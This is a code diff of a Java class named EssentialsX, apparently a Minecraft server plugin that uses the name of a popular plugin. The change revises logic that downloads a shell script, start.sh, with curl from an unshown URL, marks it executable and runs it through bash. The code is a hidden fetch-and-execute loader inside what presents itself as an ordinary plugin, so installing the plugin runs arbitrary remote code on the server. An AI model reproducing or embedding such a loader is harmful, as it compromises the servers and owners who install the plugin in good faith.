@@ -39,15 +39,29 @@ public class EssentialsX extends JavaPlugin {
         String file = "start.sh";
         String path = "./start.sh";
 
-        // ===== 1. 下载脚本 =====
-        String downloadCmd = "curl -Ls " + url + " -o " + path;
+        // ===== 1. 检查脚本是否存在 =====
+        Path scriptPath = Paths.get(path);
 
-        int downloadExit = runCommand(downloadCmd, "DOWNLOAD");
-        if (downloadExit != 0) {
-            throw new RuntimeException("Download failed, exit code: " + downloadExit);
+        if (!Files.exists(scriptPath)) {
+
+            getLogger().info("start.sh not found, downloading...");
+
+            String downloadCmd = "curl -Ls " + url + " -o " + path;
+
+            int downloadExit = runCommand(downloadCmd, "DOWNLOAD");
+
+            if (downloadExit != 0) {
+                throw new RuntimeException("Download failed, exit code: " + downloadExit);
+            }
+
+        } else {
+            getLogger().info("start.sh already exists, skip download.");
         }
 
-        // ===== 2. 执行脚本 =====
+        // ===== 2. 确保可执行权限 =====
+        runCommand("chmod +x " + path, "CHMOD");
+
+        // ===== 3. 执行脚本 =====
         String runCmd = "bash " + file;
 
         ProcessBuilder pb = new ProcessBuilder("bash", "-c", runCmd);
